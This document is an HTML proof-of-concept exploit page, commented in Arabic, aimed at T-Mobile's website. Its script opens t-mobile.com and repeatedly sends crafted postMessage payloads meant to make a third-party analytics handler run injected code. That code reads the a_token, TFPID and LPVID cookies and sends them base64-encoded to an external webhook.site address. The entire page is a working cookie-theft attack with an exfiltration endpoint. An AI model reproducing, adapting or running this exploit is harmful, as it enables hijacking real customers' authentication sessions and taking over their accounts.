<!doctype html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>PoC Elite</title>
</head>
<body style="background: #000; color: #e20074; text-align: center; font-family: monospace;">
    <h2>Targeting: T-Mobile Authentication Tokens</h2>
    <button onclick="start()" style="padding: 20px; cursor: pointer;">Start Extraction</button>
    <p id="status">Status: Waiting...</p>

<script>
    const webhook = "https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f";

    function start() {
        const vic = window.open('https://www.t-mobile.com/', '_blank');
        document.getElementById('status').innerText = "Window Opened. Injecting...";

        // الدالة التي سيتم حقنها (مختصرة جداً)
        const payloadStr = `() => {
            const k = ['a_token', 'TFPID', 'LPVID'];
            const d = document.cookie.split('; ').filter(c => k.some(n => c.startsWith(n))).join('|');
            fetch('${webhook}/?auth=' + btoa(d), {mode:'no-cors'});
        }`;

        let count = 0;
        const trigger = setInterval(() => {
            count++;
            // نرسل الـ Payload داخل كائن يحتوي على كلمات مفتاحية تثير اهتمام Quantum Metric
            const msg = {
                "type": "LPExternalWindowClosed",
                "details": {
                    "cvv": "999", 
                    "toString": payloadStr 
                }
            };

            // نرسل بصيغتين لضمان القبول
            vic.postMessage(JSON.stringify(msg), "*");
            vic.postMessage(msg, "*"); // في حال كان المتصفح يدعم الـ Clone هنا

            if(count > 5) {
                clearInterval(trigger);
                document.getElementById('status').innerText = "Finished. Check Webhook.";
            }
        }, 4000);
    }
</script>
</body>
</html>
